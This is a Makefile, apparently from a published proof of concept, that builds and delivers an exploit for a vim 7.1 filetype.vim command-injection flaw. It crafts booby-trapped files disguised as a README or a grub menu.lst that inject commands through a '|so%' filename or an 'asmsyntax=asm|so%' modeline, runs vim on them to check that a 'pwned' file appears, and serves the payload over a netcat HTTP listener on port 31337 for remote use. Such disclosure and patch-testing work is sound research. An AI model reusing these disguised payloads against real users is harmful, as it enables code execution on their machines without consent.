# Makefile for rdancer's exploit of the vim 7.1 filetype.vim vulnerability
#
# Usage {{{1
#
# There are three interested targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    This is the default target.  Compile and run the exploit.
#
#	(3) make test
#	
#	    Compile and run exploit non-interactively.

# Variables {{{1
#
# Choose the exploit to create. {{{2
# We found the weak exploit first, and it is still valid, and could be useful
# in scenarios where its file name pattern is preferred.

#EXPLOIT_FLAVOUR ?= weak
EXPLOIT_FLAVOUR ?= strong

ifeq (weak,${EXPLOIT_FLAVOUR})
	# The weak exploit {{{2
	# Exploit the execute statement at filetype.vim lines 20, 25 or
	# 31

	# Construct the name of the compiled exploit.  The
	# EXPLOIT_INITIAL portion is arbitrary, within limits.  We'll
	# try to masquerade as a readme file.
	EXPLOIT_INITIAL ?= "README-"
	# Space-separated list of extensions that work
	EXPLOIT_EXTENSIONS=".orig .bak .old .new .rpmsave .rpmnew ~ .in"
	EXPLOIT_EXTENSION ?= "~"
	EXPLOIT_BASENAME ?= $(EXPLOIT_INITIAL)"|so%"
else
  ifeq (strong,${EXPLOIT_FLAVOUR})
	# The strong exploit {{{2
	# Exploit the execute statement at filetype.vim line 181, 1255
	# or 1267

	# We'll try to masquerade as grub's menu.lst.
	#
	# Note that filetype.vim treats ``/boot/grub/menu.lst'' specially --
	# this exploit doesn't work when in that path.

	# Basename is arbitrary
	EXPLOIT_BASENAME = "menu"
	# Space-separated list of extensions that work (filetype_inc must not
	# be set for ".inc" to work)
	EXPLOIT_EXTENSIONS=".asm .s .S .a .A .mac .lst .inc"
	EXPLOIT_EXTENSION ?= ".lst"
  else
        $(error $$EXPLOIT_FLAVOUR must be set to ``weak'' or ``strong'')
  endif
endif

# Common for both exploits {{{2
EXPLOIT_DIR = "sploit"
EXPLOIT_NAME ?= $(EXPLOIT_DIR)/$(EXPLOIT_BASENAME)$(EXPLOIT_EXTENSION)

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

# Some old mktemp(1) implementations need the template, and don't
# understand the -t option
REMOTE_EXPLOIT_SAVE_AS := $(shell mktemp ./tmp/tmp.XXXXXXXXXX )

# Which port is our exploit served from
PORT = 31337
#FROM_WHERE ?= local


#
# Targets {{{1
#
# demo -- Run the exploit {{{2
.PHONY: demo
demo: sploit
	rm -f $(PWN_FILE)
	# Can't get the ifeq(remote,${FROM_WHERE}) working -- why????
	if [ x"$(FROM_WHERE)" = xremote ]; then \
		make sploit-remote; \
		vim $(VIM_OPTIONS) -- http://localhost:$(PORT)/$(EXPLOIT_NAME); \
	else \
		make sploit; \
		vim $(VIM_OPTIONS) -- $(EXPLOIT_NAME); \
	fi
	@if test -f $(PWN_FILE); then \
		echo "Exploit worked: we're pwned -- see the \`\`pwned'' file."; \
	else \
		echo "Exploit didn't work."; \
		exit 1; \
	fi

# all -- Make all exploit flavours and extensions {{{2
.PHONY: all
all:
ifeq (0,${MAKELEVEL})
	export EXPLOIT_FLAVOUR; \
	for EXPLOIT_FLAVOUR in weak strong; do \
		make all; \
	done
else
	export EXPLOIT_EXTENSION; \
	for EXPLOIT_EXTENSION in `echo $(EXPLOIT_EXTENSIONS)`; do \
		make sploit; \
	done
endif

# test -- Test whether the exploit works {{{2
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} +:q
test: demo

# test-remote -- Test remote exploitation {{{2
.PHONY: test-remote
test-remote: FROM_WHERE := remote
test-remote: http-server test

# demo-remote -- Demo remote exploitation {{{2
.PHONY: demo-remote
demo-remote: FROM_WHERE := remote
demo-remote: http-server demo

# sploit -- Compile the exploit {{{2
.PHONY: sploit
sploit: exploit.vim
	rm -f $(EXPLOIT_NAME)
	mkdir -p $(EXPLOIT_DIR)
ifneq (weak,${EXPLOIT_FLAVOUR})
	# Expand all occurrences of PWN_FILE
	sed "s#PWN_FILE#"$(PWN_FILE)"#g" >> $(EXPLOIT_NAME) < exploit-strong.vim
	# The value of asmsyntax contains the payload.  Must not contain
	# whitespace.  Prepend the double quote, as we source ourselves.
	# Fix: Some versions of sed(1) do not support the ``-i'' flag -- use temporary file (ugly)
	# -- Thanks to Tomas Hoger for the patch
	sed "1,/asmsyntax=/s/asmsyntax=/&asm|so%/" < $(EXPLOIT_NAME) > $(EXPLOIT_NAME).tmp
	mv -f $(EXPLOIT_NAME).tmp $(EXPLOIT_NAME)
	# Comment out the script -- we're lucky, ``#'' is a valid command
	#sed "s/^/# | /"                  <  $(EXPLOIT_NAME) > $(EXPLOIT_NAME).tmp
	#mv -f $(EXPLOIT_NAME).tmp $(EXPLOIT_NAME)
	cat menu.lst.in                  >> $(EXPLOIT_NAME)
else # weak
	# Seems like we're getting syntax highlighting we don't want.
	echo set syntax=none             >> $(EXPLOIT_NAME)
	# Expand all occurrences of PWN_FILE
	sed "s#PWN_FILE#"$(PWN_FILE)"#g" >> $(EXPLOIT_NAME) < exploit.vim
	cat readme.in                    >> $(EXPLOIT_NAME)
endif # weak
	rm -f exploit
	ln -s $(EXPLOIT_NAME) exploit

# sploit-remote -- Compile the (strong) remote exploit {{{2
.PHONY: sploit-remote
sploit-remote: FROM_WHERE := remote
sploit-remote: exploit-strong-remote.vim
	rm -f $(EXPLOIT_NAME){,.tmp}
	mkdir -p $(EXPLOIT_DIR)
	# Expand all occurrences of PWN_FILE and REMOTE_EXPLOIT_SAVE_AS
	sed -e "s#PWN_FILE#"$(PWN_FILE)"#g" \
		-e "s#REMOTE_EXPLOIT_SAVE_AS#"$(REMOTE_EXPLOIT_SAVE_AS)"#g" \
		                         >> $(EXPLOIT_NAME).tmp < exploit-strong-remote.vim
	sed -n '1,/CUT_HERE$$/p'         >  $(EXPLOIT_NAME)     < $(EXPLOIT_NAME).tmp
	cat menu.lst.in                  >> $(EXPLOIT_NAME)
	sed -n '/CUT_HERE$$/,$${/CUT_HERE$$/n;p;}' \
					 >> $(EXPLOIT_NAME)     < $(EXPLOIT_NAME).tmp
	rm -f exploit $(EXPLOIT_NAME).tmp
	ln -s $(EXPLOIT_NAME) exploit

# http-server -- Serve the exploit via HTTP {{{2
.PHONY: http-server
http-server: kill-http-server
	{ \
		printf 'HTTP/1.0 200 OK\r\n\r\n'; \
		sed 's/$$/\r/' < $(EXPLOIT_NAME); \
	} | netcat -lp$(PORT) >/dev/null&
	# Give netcat time to bind to the port
	# Use sleep as it's more portable
	#while :; do netstat -ln | grep '^tcp.*:'$(PORT)'.*LISTEN' && break; done
	while ! fuser -n tcp $(PORT)/tcp; do \
		sleep 1; \
	done >/dev/null 2>&1

# kill-http-server -- Terminate the phony HTTP server {{{2
.PHONY: kill-http-server
kill-http-server:
	if fuser -n tcp $(PORT)/tcp >/dev/null 2>&1; then \
		fuser -kn tcp $(PORT)/tcp >/dev/null 2>&1; \
	fi

# clean -- Remove most files we can remake {{{2
.PHONY: clean
clean:
ifeq (0,${MAKELEVEL})
	export EXPLOIT_FLAVOUR; \
	for EXPLOIT_FLAVOUR in weak strong; do \
		make clean; \
	done
else
 ifeq (1,${MAKELEVEL})
	 export EXPLOIT_EXTENSION; \
	 for EXPLOIT_EXTENSION in `echo $(EXPLOIT_EXTENSIONS)`; do \
		 make clean; \
	 done

	 rm -f -- $(PWN_FILE)
	 rm -f exploit
 else
	 rm -f -- $(EXPLOIT_NAME)
	 rm -f -- $(EXPLOIT_NAME).tmp
 endif
endif
	rm -f tmp/*
  
# mrproper -- Remove everything we can remake {{{2
.PHONY: mrproper
mrproper:
	# clean expects MAKELEVEL to be 0 initially -- set it to -1 so it gets
	# incremented to 0 in the child make
	MAKELEVEL=-1 make clean
	rm -rf $(EXPLOIT_DIR)


# test-fixed -- Test the fixed filetype.vim {{{2
.PHONY: test-fixed
test-fixed: VIM_OPTIONS := -u filetype.vim ${VIM_OPTIONS}
test-fixed: test
	
# demo-fixed -- Demo the fixed filetype.vim {{{2
.PHONY: demo-fixed
demo-fixed: VIM_OPTIONS := -u filetype.vim ${VIM_OPTIONS}
demo-fixed: demo

#
# dist -- Make a distribution tarball {{{2
.PHONY: dist
dist: mrproper all clean
	make -C .. `pwd | sed 's@.*/@@'`.tar.bz2

#
# Modeline {{{1
#
# vim: foldmethod=marker :
